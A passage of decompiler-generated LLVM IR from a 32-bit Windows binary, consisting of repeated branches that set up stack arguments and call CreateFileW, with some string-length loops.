  %574 = inttoptr i32 %573 to i32*, !insn.addr !1235
  store i32 0, i32* %574, align 4, !insn.addr !1235
  %575 = add i32 %esp.3.reload, -20, !insn.addr !1236
  %576 = inttoptr i32 %575 to i32*, !insn.addr !1236
  store i32 1, i32* %576, align 4, !insn.addr !1236
  %577 = add i32 %esp.3.reload, -24, !insn.addr !1237
  %578 = inttoptr i32 %577 to i32*, !insn.addr !1237
  store i32 4, i32* %578, align 4, !insn.addr !1237
  %579 = add i32 %esp.3.reload, -28, !insn.addr !1238
  %580 = inttoptr i32 %579 to i32*, !insn.addr !1238
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %580, align 4, !insn.addr !1238
  %581 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1239
  %582 = ptrtoint i32* %581 to i32, !insn.addr !1239
  %583 = add i32 %esp.3.reload, -32, !insn.addr !1240
  %584 = inttoptr i32 %583 to i32*, !insn.addr !1240
  store i32 0, i32* %584, align 4, !insn.addr !1240
  %585 = add i32 %esp.3.reload, -36, !insn.addr !1241
  %586 = inttoptr i32 %585 to i32*, !insn.addr !1241
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %586, align 4, !insn.addr !1241
  %587 = add i32 %esp.3.reload, -40, !insn.addr !1242
  %588 = inttoptr i32 %587 to i32*, !insn.addr !1242
  store i32 2, i32* %588, align 4, !insn.addr !1242
  %589 = add i32 %esp.3.reload, -44, !insn.addr !1243
  %590 = inttoptr i32 %589 to i32*, !insn.addr !1243
  store i32 ptrtoint (i32* @global_var_100392b0 to i32), i32* %590, align 4, !insn.addr !1243
  store i32 %582, i32* @global_var_1003e9c0, align 4, !insn.addr !1244
  %591 = add i32 %esp.3.reload, -48, !insn.addr !1245
  %592 = inttoptr i32 %591 to i32*, !insn.addr !1245
  store i32 %582, i32* %592, align 4, !insn.addr !1245
  store i32 %591, i32* %esp.5.reg2mem, !insn.addr !1246
  br label %dec_label_pc_10003485, !insn.addr !1246

dec_label_pc_100030a7:                            ; preds = %dec_label_pc_10002c24
  %593 = add i32 %esp.3.reload, -4, !insn.addr !1247
  %594 = inttoptr i32 %593 to i32*, !insn.addr !1247
  store i32 0, i32* %594, align 4, !insn.addr !1247
  %595 = add i32 %esp.3.reload, -8, !insn.addr !1248
  %596 = inttoptr i32 %595 to i32*, !insn.addr !1248
  store i32 128, i32* %596, align 4, !insn.addr !1248
  %597 = add i32 %esp.3.reload, -12, !insn.addr !1249
  %598 = inttoptr i32 %597 to i32*, !insn.addr !1249
  store i32 4, i32* %598, align 4, !insn.addr !1249
  %599 = add i32 %esp.3.reload, -16, !insn.addr !1250
  %600 = inttoptr i32 %599 to i32*, !insn.addr !1250
  store i32 0, i32* %600, align 4, !insn.addr !1250
  %601 = add i32 %esp.3.reload, -20, !insn.addr !1251
  %602 = inttoptr i32 %601 to i32*, !insn.addr !1251
  store i32 1, i32* %602, align 4, !insn.addr !1251
  %603 = add i32 %esp.3.reload, -24, !insn.addr !1252
  %604 = inttoptr i32 %603 to i32*, !insn.addr !1252
  store i32 4, i32* %604, align 4, !insn.addr !1252
  %605 = add i32 %esp.3.reload, -28, !insn.addr !1253
  %606 = inttoptr i32 %605 to i32*, !insn.addr !1253
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %606, align 4, !insn.addr !1253
  %607 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1254
  %608 = ptrtoint i32* %607 to i32, !insn.addr !1254
  %609 = add i32 %esp.3.reload, -32, !insn.addr !1255
  %610 = inttoptr i32 %609 to i32*, !insn.addr !1255
  store i32 0, i32* %610, align 4, !insn.addr !1255
  %611 = add i32 %esp.3.reload, -36, !insn.addr !1256
  %612 = inttoptr i32 %611 to i32*, !insn.addr !1256
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %612, align 4, !insn.addr !1256
  %613 = add i32 %esp.3.reload, -40, !insn.addr !1257
  %614 = inttoptr i32 %613 to i32*, !insn.addr !1257
  store i32 2, i32* %614, align 4, !insn.addr !1257
  %615 = add i32 %esp.3.reload, -44, !insn.addr !1258
  %616 = inttoptr i32 %615 to i32*, !insn.addr !1258
  store i32 ptrtoint (i32* @global_var_100392b4 to i32), i32* %616, align 4, !insn.addr !1258
  store i32 %608, i32* @global_var_1003e9c0, align 4, !insn.addr !1259
  %617 = add i32 %esp.3.reload, -48, !insn.addr !1260
  %618 = inttoptr i32 %617 to i32*, !insn.addr !1260
  store i32 %608, i32* %618, align 4, !insn.addr !1260
  store i32 %617, i32* %esp.5.reg2mem, !insn.addr !1261
  br label %dec_label_pc_10003485, !insn.addr !1261

dec_label_pc_100030d6:                            ; preds = %dec_label_pc_10002c24
  %619 = add i32 %esp.3.reload, -4, !insn.addr !1262
  %620 = inttoptr i32 %619 to i32*, !insn.addr !1262
  store i32 0, i32* %620, align 4, !insn.addr !1262
  %621 = add i32 %esp.3.reload, -8, !insn.addr !1263
  %622 = inttoptr i32 %621 to i32*, !insn.addr !1263
  store i32 128, i32* %622, align 4, !insn.addr !1263
  %623 = add i32 %esp.3.reload, -12, !insn.addr !1264
  %624 = inttoptr i32 %623 to i32*, !insn.addr !1264
  store i32 4, i32* %624, align 4, !insn.addr !1264
  %625 = add i32 %esp.3.reload, -16, !insn.addr !1265
  %626 = inttoptr i32 %625 to i32*, !insn.addr !1265
  store i32 0, i32* %626, align 4, !insn.addr !1265
  %627 = add i32 %esp.3.reload, -20, !insn.addr !1266
  %628 = inttoptr i32 %627 to i32*, !insn.addr !1266
  store i32 1, i32* %628, align 4, !insn.addr !1266
  %629 = add i32 %esp.3.reload, -24, !insn.addr !1267
  %630 = inttoptr i32 %629 to i32*, !insn.addr !1267
  store i32 4, i32* %630, align 4, !insn.addr !1267
  %631 = add i32 %esp.3.reload, -28, !insn.addr !1268
  %632 = inttoptr i32 %631 to i32*, !insn.addr !1268
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %632, align 4, !insn.addr !1268
  %633 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1269
  %634 = ptrtoint i32* %633 to i32, !insn.addr !1269
  %635 = add i32 %esp.3.reload, -32, !insn.addr !1270
  %636 = inttoptr i32 %635 to i32*, !insn.addr !1270
  store i32 0, i32* %636, align 4, !insn.addr !1270
  %637 = add i32 %esp.3.reload, -36, !insn.addr !1271
  %638 = inttoptr i32 %637 to i32*, !insn.addr !1271
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %638, align 4, !insn.addr !1271
  %639 = add i32 %esp.3.reload, -40, !insn.addr !1272
  %640 = inttoptr i32 %639 to i32*, !insn.addr !1272
  store i32 2, i32* %640, align 4, !insn.addr !1272
  %641 = add i32 %esp.3.reload, -44, !insn.addr !1273
  %642 = inttoptr i32 %641 to i32*, !insn.addr !1273
  store i32 ptrtoint (i32* @global_var_100392b8 to i32), i32* %642, align 4, !insn.addr !1273
  store i32 %634, i32* @global_var_1003e9c0, align 4, !insn.addr !1274
  %643 = add i32 %esp.3.reload, -48, !insn.addr !1275
  %644 = inttoptr i32 %643 to i32*, !insn.addr !1275
  store i32 %634, i32* %644, align 4, !insn.addr !1275
  store i32 %643, i32* %esp.5.reg2mem, !insn.addr !1276
  br label %dec_label_pc_10003485, !insn.addr !1276

dec_label_pc_10003105:                            ; preds = %dec_label_pc_10002c24
  %645 = add i32 %esp.3.reload, -4, !insn.addr !1277
  %646 = inttoptr i32 %645 to i32*, !insn.addr !1277
  store i32 0, i32* %646, align 4, !insn.addr !1277
  %647 = add i32 %esp.3.reload, -8, !insn.addr !1278
  %648 = inttoptr i32 %647 to i32*, !insn.addr !1278
  store i32 128, i32* %648, align 4, !insn.addr !1278
  %649 = add i32 %esp.3.reload, -12, !insn.addr !1279
  %650 = inttoptr i32 %649 to i32*, !insn.addr !1279
  store i32 4, i32* %650, align 4, !insn.addr !1279
  %651 = add i32 %esp.3.reload, -16, !insn.addr !1280
  %652 = inttoptr i32 %651 to i32*, !insn.addr !1280
  store i32 0, i32* %652, align 4, !insn.addr !1280
  %653 = add i32 %esp.3.reload, -20, !insn.addr !1281
  %654 = inttoptr i32 %653 to i32*, !insn.addr !1281
  store i32 1, i32* %654, align 4, !insn.addr !1281
  %655 = add i32 %esp.3.reload, -24, !insn.addr !1282
  %656 = inttoptr i32 %655 to i32*, !insn.addr !1282
  store i32 4, i32* %656, align 4, !insn.addr !1282
  %657 = add i32 %esp.3.reload, -28, !insn.addr !1283
  %658 = inttoptr i32 %657 to i32*, !insn.addr !1283
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %658, align 4, !insn.addr !1283
  %659 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1284
  %660 = ptrtoint i32* %659 to i32, !insn.addr !1284
  %661 = add i32 %esp.3.reload, -32, !insn.addr !1285
  %662 = inttoptr i32 %661 to i32*, !insn.addr !1285
  store i32 0, i32* %662, align 4, !insn.addr !1285
  %663 = add i32 %esp.3.reload, -36, !insn.addr !1286
  %664 = inttoptr i32 %663 to i32*, !insn.addr !1286
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %664, align 4, !insn.addr !1286
  %665 = add i32 %esp.3.reload, -40, !insn.addr !1287
  %666 = inttoptr i32 %665 to i32*, !insn.addr !1287
  store i32 2, i32* %666, align 4, !insn.addr !1287
  %667 = add i32 %esp.3.reload, -44, !insn.addr !1288
  %668 = inttoptr i32 %667 to i32*, !insn.addr !1288
  store i32 ptrtoint (i32* @global_var_100392bc to i32), i32* %668, align 4, !insn.addr !1288
  store i32 %660, i32* @global_var_1003e9c0, align 4, !insn.addr !1289
  %669 = add i32 %esp.3.reload, -48, !insn.addr !1290
  %670 = inttoptr i32 %669 to i32*, !insn.addr !1290
  store i32 %660, i32* %670, align 4, !insn.addr !1290
  store i32 %669, i32* %esp.5.reg2mem, !insn.addr !1291
  br label %dec_label_pc_10003485, !insn.addr !1291

dec_label_pc_10003134:                            ; preds = %dec_label_pc_10002c24
  %671 = add i32 %esp.3.reload, -4, !insn.addr !1292
  %672 = inttoptr i32 %671 to i32*, !insn.addr !1292
  store i32 0, i32* %672, align 4, !insn.addr !1292
  %673 = add i32 %esp.3.reload, -8, !insn.addr !1293
  %674 = inttoptr i32 %673 to i32*, !insn.addr !1293
  store i32 128, i32* %674, align 4, !insn.addr !1293
  %675 = add i32 %esp.3.reload, -12, !insn.addr !1294
  %676 = inttoptr i32 %675 to i32*, !insn.addr !1294
  store i32 4, i32* %676, align 4, !insn.addr !1294
  %677 = add i32 %esp.3.reload, -16, !insn.addr !1295
  %678 = inttoptr i32 %677 to i32*, !insn.addr !1295
  store i32 0, i32* %678, align 4, !insn.addr !1295
  %679 = add i32 %esp.3.reload, -20, !insn.addr !1296
  %680 = inttoptr i32 %679 to i32*, !insn.addr !1296
  store i32 1, i32* %680, align 4, !insn.addr !1296
  %681 = add i32 %esp.3.reload, -24, !insn.addr !1297
  %682 = inttoptr i32 %681 to i32*, !insn.addr !1297
  store i32 4, i32* %682, align 4, !insn.addr !1297
  %683 = add i32 %esp.3.reload, -28, !insn.addr !1298
  %684 = inttoptr i32 %683 to i32*, !insn.addr !1298
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %684, align 4, !insn.addr !1298
  %685 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1299
  %686 = ptrtoint i32* %685 to i32, !insn.addr !1299
  %687 = add i32 %esp.3.reload, -32, !insn.addr !1300
  %688 = inttoptr i32 %687 to i32*, !insn.addr !1300
  store i32 0, i32* %688, align 4, !insn.addr !1300
  %689 = add i32 %esp.3.reload, -36, !insn.addr !1301
  %690 = inttoptr i32 %689 to i32*, !insn.addr !1301
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %690, align 4, !insn.addr !1301
  %691 = add i32 %esp.3.reload, -40, !insn.addr !1302
  %692 = inttoptr i32 %691 to i32*, !insn.addr !1302
  store i32 2, i32* %692, align 4, !insn.addr !1302
  %693 = add i32 %esp.3.reload, -44, !insn.addr !1303
  %694 = inttoptr i32 %693 to i32*, !insn.addr !1303
  store i32 ptrtoint (i32* @global_var_100392c0 to i32), i32* %694, align 4, !insn.addr !1303
  store i32 %686, i32* @global_var_1003e9c0, align 4, !insn.addr !1304
  %695 = add i32 %esp.3.reload, -48, !insn.addr !1305
  %696 = inttoptr i32 %695 to i32*, !insn.addr !1305
  store i32 %686, i32* %696, align 4, !insn.addr !1305
  store i32 %695, i32* %esp.5.reg2mem, !insn.addr !1306
  br label %dec_label_pc_10003485, !insn.addr !1306

dec_label_pc_10003163:                            ; preds = %dec_label_pc_10002c24
  %697 = add i32 %esp.3.reload, -4, !insn.addr !1307
  %698 = inttoptr i32 %697 to i32*, !insn.addr !1307
  store i32 0, i32* %698, align 4, !insn.addr !1307
  %699 = add i32 %esp.3.reload, -8, !insn.addr !1308
  %700 = inttoptr i32 %699 to i32*, !insn.addr !1308
  store i32 128, i32* %700, align 4, !insn.addr !1308
  %701 = add i32 %esp.3.reload, -12, !insn.addr !1309
  %702 = inttoptr i32 %701 to i32*, !insn.addr !1309
  store i32 4, i32* %702, align 4, !insn.addr !1309
  %703 = add i32 %esp.3.reload, -16, !insn.addr !1310
  %704 = inttoptr i32 %703 to i32*, !insn.addr !1310
  store i32 0, i32* %704, align 4, !insn.addr !1310
  %705 = add i32 %esp.3.reload, -20, !insn.addr !1311
  %706 = inttoptr i32 %705 to i32*, !insn.addr !1311
  store i32 1, i32* %706, align 4, !insn.addr !1311
  %707 = add i32 %esp.3.reload, -24, !insn.addr !1312
  %708 = inttoptr i32 %707 to i32*, !insn.addr !1312
  store i32 4, i32* %708, align 4, !insn.addr !1312
  %709 = add i32 %esp.3.reload, -28, !insn.addr !1313
  %710 = inttoptr i32 %709 to i32*, !insn.addr !1313
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %710, align 4, !insn.addr !1313
  %711 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1314
  %712 = ptrtoint i32* %711 to i32, !insn.addr !1314
  %713 = add i32 %esp.3.reload, -32, !insn.addr !1315
  %714 = inttoptr i32 %713 to i32*, !insn.addr !1315
  store i32 0, i32* %714, align 4, !insn.addr !1315
  %715 = add i32 %esp.3.reload, -36, !insn.addr !1316
  %716 = inttoptr i32 %715 to i32*, !insn.addr !1316
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %716, align 4, !insn.addr !1316
  %717 = add i32 %esp.3.reload, -40, !insn.addr !1317
  %718 = inttoptr i32 %717 to i32*, !insn.addr !1317
  store i32 2, i32* %718, align 4, !insn.addr !1317
  %719 = add i32 %esp.3.reload, -44, !insn.addr !1318
  %720 = inttoptr i32 %719 to i32*, !insn.addr !1318
  store i32 ptrtoint (i32* @global_var_100392c4 to i32), i32* %720, align 4, !insn.addr !1318
  store i32 %712, i32* @global_var_1003e9c0, align 4, !insn.addr !1319
  %721 = add i32 %esp.3.reload, -48, !insn.addr !1320
  %722 = inttoptr i32 %721 to i32*, !insn.addr !1320
  store i32 %712, i32* %722, align 4, !insn.addr !1320
  store i32 %721, i32* %esp.5.reg2mem, !insn.addr !1321
  br label %dec_label_pc_10003485, !insn.addr !1321

dec_label_pc_10003192:                            ; preds = %dec_label_pc_10002c24
  %723 = add i32 %esp.3.reload, -4, !insn.addr !1322
  %724 = inttoptr i32 %723 to i32*, !insn.addr !1322
  store i32 0, i32* %724, align 4, !insn.addr !1322
  %725 = add i32 %esp.3.reload, -8, !insn.addr !1323
  %726 = inttoptr i32 %725 to i32*, !insn.addr !1323
  store i32 128, i32* %726, align 4, !insn.addr !1323
  %727 = add i32 %esp.3.reload, -12, !insn.addr !1324
  %728 = inttoptr i32 %727 to i32*, !insn.addr !1324
  store i32 4, i32* %728, align 4, !insn.addr !1324
  %729 = add i32 %esp.3.reload, -16, !insn.addr !1325
  %730 = inttoptr i32 %729 to i32*, !insn.addr !1325
  store i32 0, i32* %730, align 4, !insn.addr !1325
  %731 = add i32 %esp.3.reload, -20, !insn.addr !1326
  %732 = inttoptr i32 %731 to i32*, !insn.addr !1326
  store i32 1, i32* %732, align 4, !insn.addr !1326
  %733 = add i32 %esp.3.reload, -24, !insn.addr !1327
  %734 = inttoptr i32 %733 to i32*, !insn.addr !1327
  store i32 4, i32* %734, align 4, !insn.addr !1327
  %735 = add i32 %esp.3.reload, -28, !insn.addr !1328
  %736 = inttoptr i32 %735 to i32*, !insn.addr !1328
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %736, align 4, !insn.addr !1328
  %737 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1329
  %738 = ptrtoint i32* %737 to i32, !insn.addr !1329
  %739 = add i32 %esp.3.reload, -32, !insn.addr !1330
  %740 = inttoptr i32 %739 to i32*, !insn.addr !1330
  store i32 0, i32* %740, align 4, !insn.addr !1330
  %741 = add i32 %esp.3.reload, -36, !insn.addr !1331
  %742 = inttoptr i32 %741 to i32*, !insn.addr !1331
  store i32 ptrtoint (i32* @global_var_100410b0 to i32), i32* %742, align 4, !insn.addr !1331
  %743 = add i32 %esp.3.reload, -40, !insn.addr !1332
  %744 = inttoptr i32 %743 to i32*, !insn.addr !1332
  store i32 2, i32* %744, align 4, !insn.addr !1332
  %745 = add i32 %esp.3.reload, -44, !insn.addr !1333
  %746 = inttoptr i32 %745 to i32*, !insn.addr !1333
  store i32 ptrtoint (i32* @global_var_100392c8 to i32), i32* %746, align 4, !insn.addr !1333
  store i32 %738, i32* @global_var_1003e9c0, align 4, !insn.addr !1334
  %747 = add i32 %esp.3.reload, -48, !insn.addr !1335
  %748 = inttoptr i32 %747 to i32*, !insn.addr !1335
  store i32 %738, i32* %748, align 4, !insn.addr !1335
  store i32 %747, i32* %esp.5.reg2mem, !insn.addr !1336
  br label %dec_label_pc_10003485, !insn.addr !1336

dec_label_pc_100031c1:                            ; preds = %dec_label_pc_10002c24
  %749 = call i128 @__asm_movaps(i128 %38), !insn.addr !1337
  %750 = add i32 %esp.3.reload, -4, !insn.addr !1338
  %751 = inttoptr i32 %750 to i32*, !insn.addr !1338
  store i32 0, i32* %751, align 4, !insn.addr !1338
  %752 = add i32 %esp.3.reload, -8, !insn.addr !1339
  %753 = inttoptr i32 %752 to i32*, !insn.addr !1339
  store i32 128, i32* %753, align 4, !insn.addr !1339
  %754 = add i32 %esp.3.reload, -12, !insn.addr !1340
  %755 = inttoptr i32 %754 to i32*, !insn.addr !1340
  store i32 4, i32* %755, align 4, !insn.addr !1340
  %756 = add i32 %esp.3.reload, -16, !insn.addr !1341
  %757 = inttoptr i32 %756 to i32*, !insn.addr !1341
  store i32 0, i32* %757, align 4, !insn.addr !1341
  %758 = add i32 %esp.3.reload, -20, !insn.addr !1342
  %759 = inttoptr i32 %758 to i32*, !insn.addr !1342
  store i32 1, i32* %759, align 4, !insn.addr !1342
  %760 = add i32 %esp.3.reload, -24, !insn.addr !1343
  %761 = inttoptr i32 %760 to i32*, !insn.addr !1343
  store i32 4, i32* %761, align 4, !insn.addr !1343
  %762 = add i32 %esp.3.reload, -28, !insn.addr !1344
  %763 = inttoptr i32 %762 to i32*, !insn.addr !1344
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %763, align 4, !insn.addr !1344
  %764 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1345
  call void @__asm_movups(i128 %764, i128 %749), !insn.addr !1345
  %765 = call i32* @CreateFileW(i16* inttoptr (i32 4915267 to i16*), i32 93, i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1346
  %766 = ptrtoint i32* %765 to i32, !insn.addr !1346
  store i32 %766, i32* @global_var_1003e9c0, align 4, !insn.addr !1347
  store i32 %34, i32* %ecx.9.reg2mem, !insn.addr !1348
  br label %dec_label_pc_10003204, !insn.addr !1348

dec_label_pc_10003204:                            ; preds = %dec_label_pc_10003204, %dec_label_pc_100031c1
  %ecx.9.reload = load i32, i32* %ecx.9.reg2mem
  %767 = inttoptr i32 %ecx.9.reload to i16*, !insn.addr !1349
  %768 = load i16, i16* %767, align 2, !insn.addr !1349
  %769 = add i32 %ecx.9.reload, 2, !insn.addr !1350
  %770 = icmp eq i16 %768, 0, !insn.addr !1351
  %771 = icmp eq i1 %770, false, !insn.addr !1352
  store i32 %769, i32* %ecx.9.reg2mem, !insn.addr !1352
  store i32 %769, i32* %.pn.reg2mem, !insn.addr !1352
  store i32 %766, i32* %edx.6.reg2mem, !insn.addr !1352
  store i32 %762, i32* %esp.4.reg2mem, !insn.addr !1352
  br i1 %771, label %dec_label_pc_10003204, label %dec_label_pc_10003473, !insn.addr !1352

dec_label_pc_1000321a:                            ; preds = %dec_label_pc_10002c24
  %772 = call i128 @__asm_movaps(i128 %37), !insn.addr !1353
  %773 = add i32 %esp.3.reload, -4, !insn.addr !1354
  %774 = inttoptr i32 %773 to i32*, !insn.addr !1354
  store i32 0, i32* %774, align 4, !insn.addr !1354
  %775 = add i32 %esp.3.reload, -8, !insn.addr !1355
  %776 = inttoptr i32 %775 to i32*, !insn.addr !1355
  store i32 128, i32* %776, align 4, !insn.addr !1355
  %777 = add i32 %esp.3.reload, -12, !insn.addr !1356
  %778 = inttoptr i32 %777 to i32*, !insn.addr !1356
  store i32 4, i32* %778, align 4, !insn.addr !1356
  %779 = add i32 %esp.3.reload, -16, !insn.addr !1357
  %780 = inttoptr i32 %779 to i32*, !insn.addr !1357
  store i32 0, i32* %780, align 4, !insn.addr !1357
  %781 = add i32 %esp.3.reload, -20, !insn.addr !1358
  %782 = inttoptr i32 %781 to i32*, !insn.addr !1358
  store i32 1, i32* %782, align 4, !insn.addr !1358
  %783 = add i32 %esp.3.reload, -24, !insn.addr !1359
  %784 = inttoptr i32 %783 to i32*, !insn.addr !1359
  store i32 4, i32* %784, align 4, !insn.addr !1359
  %785 = add i32 %esp.3.reload, -28, !insn.addr !1360
  %786 = inttoptr i32 %785 to i32*, !insn.addr !1360
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %786, align 4, !insn.addr !1360
  %787 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1361
  call void @__asm_movups(i128 %787, i128 %772), !insn.addr !1361
  %788 = call i32* @CreateFileW(i16* inttoptr (i32 93 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1362
  %789 = ptrtoint i32* %788 to i32, !insn.addr !1362
  store i32 %789, i32* @global_var_1003e9c0, align 4, !insn.addr !1363
  store i32 %34, i32* %ecx.10.reg2mem, !insn.addr !1364
  br label %dec_label_pc_10003256, !insn.addr !1364

dec_label_pc_10003256:                            ; preds = %dec_label_pc_10003256, %dec_label_pc_1000321a
  %ecx.10.reload = load i32, i32* %ecx.10.reg2mem
  %790 = inttoptr i32 %ecx.10.reload to i16*, !insn.addr !1365
  %791 = load i16, i16* %790, align 2, !insn.addr !1365
  %792 = add i32 %ecx.10.reload, 2, !insn.addr !1366
  %793 = icmp eq i16 %791, 0, !insn.addr !1367
  %794 = icmp eq i1 %793, false, !insn.addr !1368
  store i32 %792, i32* %ecx.10.reg2mem, !insn.addr !1368
  store i32 %792, i32* %.pn.reg2mem, !insn.addr !1368
  store i32 %789, i32* %edx.6.reg2mem, !insn.addr !1368
  store i32 %785, i32* %esp.4.reg2mem, !insn.addr !1368
  br i1 %794, label %dec_label_pc_10003256, label %dec_label_pc_10003473, !insn.addr !1368

dec_label_pc_1000326c:                            ; preds = %dec_label_pc_10002c24
  %795 = call i128 @__asm_movaps(i128 %36), !insn.addr !1369
  %796 = add i32 %esp.3.reload, -4, !insn.addr !1370
  %797 = inttoptr i32 %796 to i32*, !insn.addr !1370
  store i32 0, i32* %797, align 4, !insn.addr !1370
  %798 = add i32 %esp.3.reload, -8, !insn.addr !1371
  %799 = inttoptr i32 %798 to i32*, !insn.addr !1371
  store i32 128, i32* %799, align 4, !insn.addr !1371
  %800 = add i32 %esp.3.reload, -12, !insn.addr !1372
  %801 = inttoptr i32 %800 to i32*, !insn.addr !1372
  store i32 4, i32* %801, align 4, !insn.addr !1372
  %802 = add i32 %esp.3.reload, -16, !insn.addr !1373
  %803 = inttoptr i32 %802 to i32*, !insn.addr !1373
  store i32 0, i32* %803, align 4, !insn.addr !1373
  %804 = add i32 %esp.3.reload, -20, !insn.addr !1374
  %805 = inttoptr i32 %804 to i32*, !insn.addr !1374
  store i32 1, i32* %805, align 4, !insn.addr !1374
  %806 = add i32 %esp.3.reload, -24, !insn.addr !1375
  %807 = inttoptr i32 %806 to i32*, !insn.addr !1375
  store i32 4, i32* %807, align 4, !insn.addr !1375
  %808 = add i32 %esp.3.reload, -28, !insn.addr !1376
  %809 = inttoptr i32 %808 to i32*, !insn.addr !1376
  store i32 ptrtoint (i16** @global_var_10040da8 to i32), i32* %809, align 4, !insn.addr !1376
  %810 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1377
  call void @__asm_movups(i128 %810, i128 %795), !insn.addr !1377
  %811 = call i32* @CreateFileW(i16* inttoptr (i32 5111895 to i16*), i32 93, i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1378
  %812 = ptrtoint i32* %811 to i32, !insn.addr !1378
  store i32 %812, i32* @global_var_1003e9c0, align 4, !insn.addr !1379
  store i32 %34, i32* %ecx.11.reg2mem, !insn.addr !1380
  br label %dec_label_pc_100032b0, !insn.addr !1380

dec_label_pc_100032b0:                            ; preds = %dec_label_pc_100032b0, %dec_label_pc_1000326c
  %ecx.11.reload = load i32, i32* %ecx.11.reg2mem
  %813 = inttoptr i32 %ecx.11.reload to i16*, !insn.addr !1381
  %814 = load i16, i16* %813, align 2, !insn.addr !1381
  %815 = add i32 %ecx.11.reload, 2, !insn.addr !1382
  %816 = icmp eq i16 %814, 0, !insn.addr !1383
  %817 = icmp eq i1 %816, false, !insn.addr !1384
  store i32 %815, i32* %ecx.11.reg2mem, !insn.addr !1384
  store i32 %815, i32* %.pn.reg2mem, !insn.addr !1384
  store i32 %812, i32* %edx.6.reg2mem, !insn.addr !1384
  store i32 %808, i32* %esp.4.reg2mem, !insn.addr !1384
  br i1 %817, label %dec_label_pc_100032b0, label %dec_label_pc_10003473, !insn.addr !1384

dec_label_pc_100032c6:                            ; preds = %dec_label_pc_10002c24
  %818 = add i32 %esp.3.reload, -4, !insn.addr !1385
  %819 = inttoptr i32 %818 to i32*, !insn.addr !1385
  store i32 0, i32* %819, align 4, !insn.addr !1385
  %820 = add i32 %esp.3.reload, -8, !insn.addr !1386
  %821 = inttoptr i32 %820 to i32*, !insn.addr !1386
  store i32 128, i32* %821, align 4, !insn.addr !1386
  %822 = add i32 %esp.3.reload, -12, !insn.addr !1387
  %823 = inttoptr i32 %822 to i32*, !insn.addr !1387
  store i32 4, i32* %823, align 4, !insn.addr !1387
  %824 = add i32 %esp.3.reload, -16, !insn.addr !1388
  %825 = inttoptr i32 %824 to i32*, !insn.addr !1388
  store i32 0, i32* %825, align 4, !insn.addr !1388
  %826 = add i32 %esp.3.reload, -20, !insn.addr !1389
  %827 = inttoptr i32 %826 to i32*, !insn.addr !1389
  store i32 1, i32* %827, align 4, !insn.addr !1389
